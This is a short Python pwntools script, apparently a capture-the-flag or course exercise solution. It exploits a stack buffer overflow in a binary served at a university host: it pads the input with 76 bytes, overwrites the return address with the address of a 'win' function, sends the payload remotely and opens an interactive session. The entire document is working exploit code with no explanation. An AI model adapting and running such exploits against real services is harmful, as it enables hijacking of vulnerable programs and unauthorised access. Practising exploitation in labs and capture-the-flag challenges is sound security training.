from pwn import *
import sys

host ='mustard.stt.rnl.tecnico.ulisboa.pt'
port = '9993'

elf = ELF('./bin')

s = b'A' * 76 + p32(elf.symbols['win'])

#s = b'A' * 76 + p32(0x8048619)

p = remote(host, port)
#p = process('./bin')

#raw_input()

p.sendline(s)
p.interactive()